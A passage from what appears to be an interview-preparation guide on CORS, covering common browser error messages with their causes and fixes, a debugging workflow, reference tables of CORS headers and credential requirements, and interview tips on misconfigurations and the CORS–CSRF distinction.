        header in the response must not be the wildcard '*' when the request's
        credentials mode is 'include'."

  Cause: credentials: "include" with ACAO: *.
  Fix: set ACAO to the specific requesting origin; set ACAC: true.


Error: "...blocked by CORS policy: Request header field x-custom-header is not
        allowed by Access-Control-Allow-Headers in preflight response."

  Cause: the custom header sent by the client is not listed in ACAH.
  Fix: add the header (lowercased) to Access-Control-Allow-Headers.


Debugging workflow:

1. Open DevTools → Network tab → find the failing request.
2. If there is a separate OPTIONS request: check its response headers first.
   Missing ACAO on OPTIONS → preflight failed → actual request never sent.
3. Check the actual request (if it was sent): does its response have ACAO?
4. Compare: browser's Origin header === server's ACAO value? Exact match?
5. If credentials: check ACAC: true AND ACAO is not *.
6. Check middleware order in server code: CORS before auth.
7. Check that error responses (4xx, 5xx) also have CORS headers.
```

## Quick Reference: CORS Headers

| Header | Direction | Purpose | Example Value |
|---|---|---|---|
| `Origin` | Request | Browser-set source origin | `https://app.myorg.com` |
| `Access-Control-Request-Method` | Preflight request | Declares actual request method | `POST` |
| `Access-Control-Request-Headers` | Preflight request | Declares actual request headers | `content-type, authorization` |
| `Access-Control-Allow-Origin` | Response | Permitted origin(s) | `https://app.myorg.com` or `*` |
| `Access-Control-Allow-Methods` | Preflight response | Permitted methods | `GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | Preflight response | Permitted request headers | `content-type, authorization` |
| `Access-Control-Allow-Credentials` | Response (both) | Whether credentials are allowed | `true` |
| `Access-Control-Max-Age` | Preflight response | Preflight cache duration (seconds) | `7200` |
| `Access-Control-Expose-Headers` | Actual response | Non-safelisted headers JS may read | `x-total-count, x-request-id` |
| `Vary` | Response (both) | Cache key includes Origin | `Origin` |

## Quick Reference: Simple vs Non-Simple Requests

| Condition | Simple | Non-Simple (preflight required) |
|---|---|---|
| Method | `GET`, `HEAD`, `POST` | `PUT`, `PATCH`, `DELETE`, `CONNECT`, `TRACE` |
| `Content-Type` | `text/plain`, `multipart/form-data`, `application/x-www-form-urlencoded` | `application/json`, `application/xml`, anything else |
| Custom headers | None | Any header not in the safelist (e.g., `Authorization`, `X-*`) |
| `Authorization` header | N/A | Always triggers preflight |
| Effect | Request fires directly | `OPTIONS` preflight sent first; actual request only if preflight succeeds |

## Quick Reference: Credentials Checklist

| Requirement | Client Side | Server Side |
|---|---|---|
| Send credentials | `credentials: "include"` | — |
| Allow credentials | — | `Access-Control-Allow-Credentials: true` |
| Specific origin (not wildcard) | — | `Access-Control-Allow-Origin: https://exact-origin.com` |
| Cookie must travel cross-origin | Cookie: `SameSite=None; Secure` | Set-Cookie with `SameSite=None; Secure` |
| Cache key correct | — | `Vary: Origin` |
| All of the above on preflight too | — | `ACAC: true` + `ACAO: <origin>` on OPTIONS response |

**Tip for the interview:** At 5 YOE, the CORS question is almost never "what does CORS stand for?" — it's either a debugging scenario ("my fetch is being blocked, walk me through how you'd diagnose it") or a security question ("what's wrong with this CORS configuration?"). Know the simple vs non-simple request distinction cold (Q7) — interviewers use it to probe depth because most developers don't know why `Authorization` triggers a preflight. The three credentials requirements (Q11) are the most common "gotcha" question: `ACAO ≠ *`, `ACAC: true`, and `SameSite=None; Secure` on the cookie — all three must hold simultaneously. The `Vary: Origin` header (Q5) is a senior-level signal: most developers omit it and create subtle CDN caching bugs. Know the CORS vs CSRF distinction precisely (Q14) — conflating them is a common tell, and the correct answer ("CORS prevents reads, CSRF exploits writes, they're orthogonal") is what differentiates a security-aware engineer. For misconfiguration questions (Q13), the two most dangerous are: reflecting any Origin with credentials enabled, and trusting the Origin header for access control decisions — know why each is wrong and what the exploit looks like.
